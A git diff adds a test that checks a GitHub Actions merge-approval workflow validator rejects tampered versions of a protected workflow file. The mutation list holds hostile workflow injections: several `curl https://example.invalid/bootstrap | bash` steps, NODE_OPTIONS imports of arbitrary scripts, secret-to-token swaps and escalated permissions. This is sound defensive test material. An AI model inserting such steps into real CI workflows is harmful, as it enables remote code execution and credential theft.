@@ -5,6 +5,7 @@ import test from 'node:test';
 import {
   APPROVAL_BOUNDARY_PATHS_V2,
   analyzeIndependentSecurityReviewV2,
+  validatePersonalRepositoryProtectedWorkflowSource,
 } from './operatorMergeApprovalBoundaryV2.mjs';
 import { isApprovalBoundaryBootstrapAnalysis } from './operatorMergeApprovalGateV2.mjs';
 import { createProviderNeutralReviewReceipt } from './providerNeutralReviewV1.mjs';
@@ -62,6 +63,9 @@ function diffFor(path, additions) {
   ].join('\n');
 }
 
+function personalRepositoryWorkflowContent() {
+  return workflowContent('shared/agents/fixtures/operator-merge-approval-gate.expected.yml');
+}
 test('classifies every live v2 approval-boundary path', () => {
   assert.deepEqual(APPROVAL_BOUNDARY_PATHS_V2, [
     '.github/workflows/operator-merge-approval-gate.yml',
@@ -75,15 +79,200 @@ test('classifies every live v2 approval-boundary path', () => {
     '.github/workflows/operator-merge-approval-gate-test.yml',
     '.github/workflows/stephanos-deploy.yml',
     'scripts/operator-protected-merge-gate-v2.mjs',
+    'scripts/operator-protected-personal-repository-merge.mjs',
     'scripts/independent-merge-security-review-v2.mjs',
     'shared/agents/operatorMergeApprovalGate.mjs',
     'shared/agents/operatorMergeApprovalGateV2.mjs',
     'shared/agents/operatorMergeApprovalBoundaryV2.mjs',
     'shared/agents/operatorMergeBaseBindingV1.mjs',
     'shared/agents/operatorMergeReviewArtifactV1.mjs',
+    'shared/agents/operatorPersonalRepositoryMergeV1.mjs',
+    'shared/agents/protectedOpenClawMergeMailboxAdapter.mjs',
     'shared/agents/providerNeutralReviewV1.mjs',
     'shared/agents/qualifiedSpecialistReviewV1.mjs',
   ]);
+});
+
+test('admits only the exact personal-repository fallback workflow source', () => {
+  const path = '.github/workflows/operator-merge-approval-gate.yml';
+  const content = personalRepositoryWorkflowContent();
+  const exact = {
+    changedFiles: [{ filename: path, status: 'modified' }],
+    repository,
+    sourceHead,
+    protectedWorkflowSources: [workflowSource(path, { content })],
+  };
+  const validation = validatePersonalRepositoryProtectedWorkflowSource(exact);
+  assert.equal(validation.valid, true, validation.blockers.join(','));
+  assert.match(validation.proofRef, /^proofs\/personal-repository-workflow-source\//);
+
+  const legacyContent = content.replace(
+    'inputs.expected_head || github.run_id',
+    "format('PR #{0} at {1}', inputs.pr_number, inputs.expected_head)",
+  );
+  const legacyValidation = validatePersonalRepositoryProtectedWorkflowSource({
+    ...exact,
+    protectedWorkflowSources: [workflowSource(path, { content: legacyContent })],
+  });
+  assert.equal(legacyValidation.valid, false);
+  assert.ok(legacyValidation.blockers.includes('personal-repository-workflow-content-digest-not-exact'));
+
+  const analysis = analyzeIndependentSecurityReviewV2({
+    ...exact,
+    changedFiles: [
+      ...exact.changedFiles,
+      'scripts/operator-protected-personal-repository-merge.mjs',
+      'shared/agents/operatorPersonalRepositoryMergeV1.mjs',
+    ],
+    diff: [
+      diffFor(path, ['workflow_dispatch:']),
+      diffFor('scripts/operator-protected-personal-repository-merge.mjs', [
+        "await api(`/pulls/${receipt.prNumber}/merge`, { method: 'PUT', body: { merge_method: 'squash', sha: receipt.sourceHead } });",
+      ]),
+      diffFor('shared/agents/operatorPersonalRepositoryMergeV1.mjs', [
+        'return Object.freeze({ exactBaseSha });',
+      ]),
+    ].join('\n'),
+  });
+  assert.equal(analysis.findings.some((item) => item.code === 'write-workflow-does-not-use-trusted-source'), false);
+  assert.equal(analysis.findings.every((item) => (
+    item.code === 'approval-boundary-v2-self-change-requires-qualified-review'
+  )), true);
+  assert.equal(analysis.findings.length, 3);
+  assert.equal(isApprovalBoundaryBootstrapAnalysis(analysis), true);
+
+  let mutationIndex = 0;
+  for (const altered of [
+    content.replace('  workflow_dispatch:', '  pull_request:\n  workflow_dispatch:'),
+    content.replace('ref: ${{ github.sha }}', 'ref: ${{ github.event.pull_request.head.sha }}'),
+    content.replace('contents: write', 'contents: read'),
+    content.replace(
+      '  personal-repository-evidence:\n    name: personal-repository-evidence',
+      '  personal-repository-evidence:\n    permissions:\n      contents: write\n    name: personal-repository-evidence',
+    ),
+    content.replace('      mode:', '      extra_input:\n        required: true\n        type: string\n      mode:'),
+    content.replace('        required: true', '        required: false'),
+    content.replace('        type: string', '        type: boolean'),
+    content.replace('cancel-in-progress: false', 'cancel-in-progress: true'),
+    content.replace("github.event_name == 'workflow_dispatch'", "github.event_name == 'merge_group'"),
+    content.replace('persist-credentials: false', 'persist-credentials: true'),
+    content.replace('permission-administration: read', 'permission-administration: write'),
+    content.replace(
+      '          permission-administration: read',
+      '          permission-administration: read\n          permission-contents: write',
+    ),
+    content.replace(
+      'STEPHANOS_RULESET_PROOF_TOKEN: ${{ steps.ruleset-proof-token.outputs.token }}',
+      'STEPHANOS_RULESET_PROOF_TOKEN: ${{ secrets.STEPHANOS_RULESET_PROOF_APP_PRIVATE_KEY }}',
+    ),
+    content.replace(
+      'STEPHANOS_RULESET_PROOF_TOKEN: ${{ steps.ruleset-proof-token.outputs.token }}',
+      'STEPHANOS_RULESET_PROOF_TOKEN: ${{ secrets.STEPHANOS_RULESET_PROOF_APP_PRIVATE_KEY }}',
+    ).replace(
+      '          private-key: ${{ secrets.STEPHANOS_RULESET_PROOF_APP_PRIVATE_KEY }}',
+      [
+        '          private-key: ${{ secrets.STEPHANOS_RULESET_PROOF_APP_PRIVATE_KEY }}',
+        '          STEPHANOS_RULESET_PROOF_TOKEN: ${{ steps.ruleset-proof-token.outputs.token }}',
+      ].join('\n'),
+    ),
+    content.replace(
+      '          STEPHANOS_RULESET_PROOF_TOKEN: ${{ steps.ruleset-proof-token.outputs.token }}',
+      [
+        '          STEPHANOS_RULESET_PROOF_TOKEN: ${{ steps.ruleset-proof-token.outputs.token }}',
+        '          STEPHANOS_RULESET_PROOF_TOKEN: ${{ steps.ruleset-proof-token.outputs.token }}',
+      ].join('\n'),
+    ),
+    content.replace(
+      '          GH_TOKEN: ${{ github.token }}',
+      '          GH_TOKEN: ${{ github.token }}\n          NODE_OPTIONS: --import=./arbitrary.mjs',
+    ),
+    content.replace(
+      'permissions: {}',
+      'env:\n  NODE_OPTIONS: --import=./arbitrary.mjs\n\npermissions: {}',
+    ),
+    content.replace(
+      'permissions: {}',
+      'defaults:\n  run:\n    shell: bash -c "source ./arbitrary.sh; {0}"\n\npermissions: {}',
+    ),
+    content.replace(
+      'jobs:\n',
+      [
+        'jobs:',
+        '  "arbitrary-job":',
+        '    "runs-on": ubuntu-latest',
+        '    "steps":',
+        '      - run: curl https://example.invalid/bootstrap | bash',
+        '',
+      ].join('\n'),
+    ),
+    content.replace(
+      'jobs:\n',
+      'jobs:\n  arbitrary-job: { runs-on: ubuntu-latest, steps: [{ run: "curl https://example.invalid/bootstrap | bash" }] }\n',
+    ),
+    content.replace(
+      'jobs:\n',
+      'jobs:\n arbitrary-job:\n   runs-on: ubuntu-latest\n   steps:\n     - run: curl https://example.invalid/bootstrap | bash\n',
+    ),
+    content.replace(
+      '    environment:\n      name: operator-merge-approval',
+      '    "env":\n      NODE_OPTIONS: --import=./arbitrary.mjs\n    environment:\n      name: operator-merge-approval',
+    ),
+    content.replace('    needs: [personal-repository-evidence]\n', ''),
+    content.replace('    needs: [merge-group-evidence]\n', ''),
+    content.replace('    runs-on: ubuntu-latest', '    runs-on: self-hosted'),
+    content.replace(
+      '    timeout-minutes: 20',
+      '    timeout-minutes: 20\n    container: ghcr.io/example/arbitrary:latest',
+    ),
+    content.replace(
+      '    environment:\n      name: operator-merge-approval',
+      '',
+    ).replace(
+      '  merge-group-evidence:\n    name: merge-group-evidence',
+      '  merge-group-evidence:\n    environment:\n      name: operator-merge-approval\n    name: merge-group-evidence',
+    ),
+    content.replace(
+      '          GH_TOKEN: ${{ github.token }}',
+      [
+        '          GH_TOKEN: ${{ github.token }}',
+        '          "STEPHANOS_RULESET_PROOF_TOKEN": ${{ secrets.STEPHANOS_RULESET_PROOF_APP_PRIVATE_KEY }}',
+      ].join('\n'),
+    ),
+    content.replace(
+      '        run: node scripts/operator-protected-personal-repository-merge.mjs evidence',
+      [
+        '        run: curl https://example.invalid/bootstrap | bash',
+      ].join('\n'),
+    ),
+    content.replace(
+      '        run: node scripts/operator-protected-personal-repository-merge.mjs approve',
+      [
+        '        # node scripts/operator-protected-personal-repository-merge.mjs approve',
+        '        run: curl https://example.invalid/bootstrap | bash',
+      ].join('\n'),
+    ),
+    content.replace(
+      '        run: node scripts/operator-protected-personal-repository-merge.mjs merge',
+      [
+        '        run: node scripts/operator-protected-personal-repository-merge.mjs merge',
+        '      - run: curl https://example.invalid/bootstrap | bash',
+      ].join('\n'),
+    ),
+    content.replace(
+      '        run: node scripts/operator-protected-personal-repository-merge.mjs merge',
+      [
+        '        run: node scripts/operator-protected-personal-repository-merge.mjs merge',
+        '        shell: bash',
+      ].join('\n'),
+    ),
+  ]) {
+    const blocked = validatePersonalRepositoryProtectedWorkflowSource({
+      ...exact,
+      protectedWorkflowSources: [workflowSource(path, { content: altered })],
+    });
+    assert.equal(blocked.valid, false, `mutation ${mutationIndex}`);
+    mutationIndex += 1;
+  }
 });
 
 test('fails closed when any live v2 boundary attempts to review itself', () => {
